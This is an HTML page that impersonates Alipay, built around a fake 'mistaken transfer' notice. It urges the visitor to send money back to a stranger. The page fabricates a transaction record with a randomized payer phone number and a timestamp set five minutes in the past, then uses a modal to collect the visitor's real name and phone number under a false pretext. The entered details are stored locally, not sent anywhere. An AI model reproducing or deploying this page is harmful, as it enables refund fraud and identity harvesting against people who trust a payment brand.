<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>转错款详情</title>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <style>
        body {
            background: #0085FF;
            margin: 0;
            font-family: "微软雅黑", "Arial", sans-serif;
        }
        #dialog {
            background: #fff;
            border-radius: 10px;
            padding: 0 0 20px 0;
            margin: 80px auto 0 auto;
            max-width: 420px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.08);
            overflow: hidden;
        }
        #dialog-header {
            background: #0085FF;
            color: #fff;
            font-size: 22px;
            font-weight: bold;
            text-align: left;
            padding: 18px 24px 12px 24px;
            letter-spacing: 2px;
        }
        #dialog-content {
            padding: 0 24px;
        }
        #content { 
            display: none; 
            background: #fff; 
            border-radius: 10px; 
            padding: 30px; 
            margin: 80px auto 0 auto; 
            max-width: 400px; 
            box-shadow: 0 8px 24px rgba(0,0,0,0.08);
            text-align: center;
        }
        #menu { 
            position: fixed; 
            top: 10px; 
            right: 20px; 
            cursor: pointer; 
            color: #fff; 
            font-weight: bold;
            background: rgba(0,0,0,0.1);
            padding: 8px 16px;
            border-radius: 20px;
        }
        .btn {
            display: inline-block;
            margin: 10px 8px 0 0;
            padding: 10px 18px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
        }
        .btn-primary {
            background: #0085FF;
            color: #fff;
        }
        .btn-disabled {
            background: #eee;
            color: #aaa;
            cursor: not-allowed;
        }
        .tag {
            display: inline-block;
            background: #ff4d4f;
            color: #fff;
            border-radius: 10px;
            font-size: 12px;
            padding: 2px 8px;
            margin-left: 6px;
            vertical-align: middle;
        }
        h2 { color: #0085FF; margin-bottom: 10px;}
        .gray { color: #888; font-size: 13px; }
        a { color: #0085FF; text-decoration: underline; cursor:pointer;}
        /* 自定义弹窗样式 */
        #customModalMask {
            position: fixed; left:0; top:0; right:0; bottom:0;
            background: rgba(0,0,0,0.35);
            z-index: 9999;
            display: none;
        }
        #customModal {
            background: #fff;
            border-radius: 12px;
            max-width: 90vw;
            width: 340px;
            margin: 100px auto 0 auto;
            box-shadow: 0 8px 24px rgba(0,0,0,0.12);
            padding: 24px 18px 18px 18px;
            text-align: left;
            position: relative;
        }
        #customModal h3 {
            margin: 0 0 12px 0;
            font-size: 18px;
            color: #0085FF;
            text-align: center;
        }
        #customModal label {
            display: block;
            margin: 12px 0 4px 0;
            font-size: 15px;
        }
        #customModal input {
            width: 100%;
            padding: 8px 6px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 5px;
            margin-bottom: 8px;
            box-sizing: border-box;
        }
        #customModal .modal-btns {
            text-align: right;
            margin-top: 10px;
        }
        #customModal .modal-btns button {
            min-width: 70px;
            padding: 7px 0;
            margin-left: 10px;
            border-radius: 5px;
            border: none;
            font-size: 15px;
        }
        #customModal .modal-btns .ok {
            background: #0085FF;
            color: #fff;
        }
        #customModal .modal-btns .cancel {
            background: #eee;
            color: #666;
        }
        @media (max-width: 500px) {
            #dialog, #content { margin: 30px 0 0 0; max-width: 98vw;}
            #customModal { margin: 40px auto 0 auto; }
        }
    </style>
</head>
<body>
    <div id="menu">我的信息</div>
    <div id="dialog">
        <div id="dialog-header">支付宝</div>
        <div id="dialog-content">
            <h2>转错款详情</h2>
            <div class="gray" style="margin-bottom:10px;">处理状态：<span style="color:#0085FF">已提交</span></div>
            <div style="font-size:15px;line-height:1.7;">
                有用户向支付宝反馈因输错账号向您此账户误转一笔钱，<a id="checkLink">点此进入单单核实</a>，如情况属实您可自行操作转回，转账详情如下：<br>
                <br>打款方：<span id="payer"></span>
                <br>收款方：138******56
                <br>转账交易号：20251106200040011100170099590526
                <br>转账金额：1.00
                <br>转账时间：<span id="transTime"></span>
            </div>
            <div style="margin:18px 0 8px 0;">请选择以下方式之一进行处理：</div>
            <button class="btn btn-primary" id="btnSelf">自行转回给对方 <span class="tag">推荐</span></button>
            <button class="btn btn-disabled" id="btnAuth">授权支付宝退回对方</button>
            <div class="gray" style="margin-top:8px;">
                <div>自行转回：点击后会进入打款人转账界面，确认金额无误后可直接向对方转账</div>
                <div>授权退回：我的账户余额充足，但不方便自行操作，需授权支付宝客服协助操作退款</div>
            </div>
        </div>
    </div>
    <div id="content">
        <h2>欢迎访问，已通过身份验证！</h2>
        <p>这里是你的网页内容。</p>
    </div>
    <!-- 自定义弹窗 -->
    <div id="customModalMask">
        <div id="customModal">
            <h3>身份信息确认</h3>
            <form id="modalForm" autocomplete="off">
                <label for="modalPhone">由于近期转错款次数超过2次，请确认身份输入当前正在使用的手机号码：</label>
                <input type="tel" id="modalPhone" maxlength="11" pattern="^1[3-9]\\d{9}$" required placeholder="请输入手机号">
                <label for="modalName">由于近期转错款次数超过2次，请输入真实姓名：</label>
                <input type="text" id="modalName" maxlength="10" required placeholder="请输入真实姓名">
                <div class="modal-btns">
                    <button type="button" class="cancel" id="modalCancel">取消</button>
                    <button type="submit" class="ok">确定</button>
                </div>
            </form>
        </div>
    </div>
    <script>
        // 生成随机手机号
        function randomPhone() {
            const heads = ['136', '178', '189', '135'];
            const head = heads[Math.floor(Math.random() * heads.length)];
            let mid = '';
            for(let i=0;i<6;i++) mid += Math.floor(Math.random()*10);
            let tail = '';
            for(let i=0;i<2;i++) tail += Math.floor(Math.random()*10);
            return head + mid + tail;
        }
        // 格式化手机号为 136******49
        function maskPhone(phone) {
            return phone.substr(0,3) + '******' + phone.substr(9,2);
        }
        // 获取当前时间减5分钟
        function getTimeStr() {
            const d = new Date(Date.now() - 5*60*1000);
            const pad = n => n<10?'0'+n:n;
            return d.getFullYear() + '-' + pad(d.getMonth()+1) + '-' + pad(d.getDate()) + ' ' +
                pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
        }
        // 页面初始化
        window.onload = function() {
            const phone = randomPhone();
            document.getElementById('payer').innerText = maskPhone(phone);
            document.getElementById('transTime').innerText = getTimeStr();
        };

        function checkPhone(phone) {
            return /^1[3-9]\d{9}$/.test(phone);
        }
        function checkName(name) {
            return name && name.trim().length >= 2;
        }

        // 自定义弹窗逻辑
        function showCustomModal(onSuccess) {
            document.getElementById('customModalMask').style.display = 'block';
            document.getElementById('modalPhone').value = '';
            document.getElementById('modalName').value = '';
            document.getElementById('modalPhone').focus();
            // 取消按钮
            document.getElementById('modalCancel').onclick = function() {
                document.getElementById('customModalMask').style.display = 'none';
            };
            // 表单提交
            document.getElementById('modalForm').onsubmit = function(e) {
                e.preventDefault();
                let phone = document.getElementById('modalPhone').value.trim();
                let name = document.getElementById('modalName').value.trim();
                if (!checkPhone(phone)) {
                    alert('请输入正确的手机号码！');
                    document.getElementById('modalPhone').focus();
                    return;
                }
                if (!checkName(name)) {
                    alert('请输入真实姓名（不少于2个字）！');
                    document.getElementById('modalName').focus();
                    return;
                }
                localStorage.setItem('my_phone', phone);
                localStorage.setItem('my_name', name);
                document.getElementById('customModalMask').style.display = 'none';
                if (typeof onSuccess === 'function') onSuccess();
            };
        }

        function afterIdentity() {
            document.getElementById('content').style.display = 'block';
            document.getElementById('dialog').style.display = 'none';
            setTimeout(function() {
                alert('已自行转回给对方，请关闭页面');
            }, 100);
        }

        document.getElementById('btnSelf').onclick = function() {
            showCustomModal(afterIdentity);
        };
        document.getElementById('btnAuth').onclick = function() {
            alert('暂不支持当前方式处理');
        };
        document.getElementById('menu').onclick = function() {
            let phone = localStorage.getItem('my_phone');
            let name = localStorage.getItem('my_name');
            if (phone && checkPhone(phone) && name && checkName(name)) {
                alert('当前手机号：' + phone + '\\n真实姓名：' + name);
            } else {
                alert('暂无已保存身份信息');
            }
        }
        document.getElementById('checkLink').onclick = function() {
            showCustomModal(afterIdentity);
        }
    </script>
</body>
</html>
